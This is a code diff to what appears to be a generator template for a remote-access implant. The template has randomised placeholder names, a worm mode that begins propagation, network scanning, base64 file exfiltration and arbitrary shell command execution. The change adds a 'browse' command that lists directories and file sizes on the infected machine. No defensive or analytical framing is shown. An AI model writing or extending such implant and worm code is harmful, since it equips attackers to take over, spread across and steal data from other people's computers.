@@ -89,6 +89,25 @@ def scan_network(subnet, ports):
         results["error"] = f"Scan failed: {{e}}"
     return results
 
+def handle_browse(path):
+    try:
+        entries = []
+        for entry in os.listdir(path):
+            full_path = os.path.join(path, entry)
+            if os.path.isdir(full_path):
+                entries.append({{"name": entry, "type": "folder"}})
+            else:
+                entry_info = {{"name": entry, "type": "file"}}
+                try:
+                    entry_info["size"] = os.path.getsize(full_path)
+                except Exception:
+                    entry_info["size"] = "N/A"
+                entries.append(entry_info)
+        return json.dumps({{"path": path, "entries": entries}})
+    except Exception as e:
+        return json.dumps({{"error": str(e)}})
+
+
 def {beacon_func}():
     if IS_WORM:
         print("[*] Worm mode enabled — beginning propagation...")
@@ -140,6 +159,11 @@ def {beacon_func}():
                             {result_var} = f"[EXFIL:{{{{ {file_path} }}}}]\\n{{{{ {b64data} }}}}"
                         except Exception as e:
                             {result_var} = f"[!] Failed to read file: {{e}}"
+
+                    elif {cmd_var}.startswith("browse "):
+                        path = {cmd_var}[7:].strip()
+                        {result_var} = handle_browse(path)
+
                     else:
                         try:
                             {out_var} = subprocess.check_output({cmd_var}, shell=True, stderr=subprocess.STDOUT, timeout=10)
@@ -166,6 +190,7 @@ def {beacon_func}():
 
 if __name__ == "__main__":
     {beacon_func}()
+
 '''
 
 
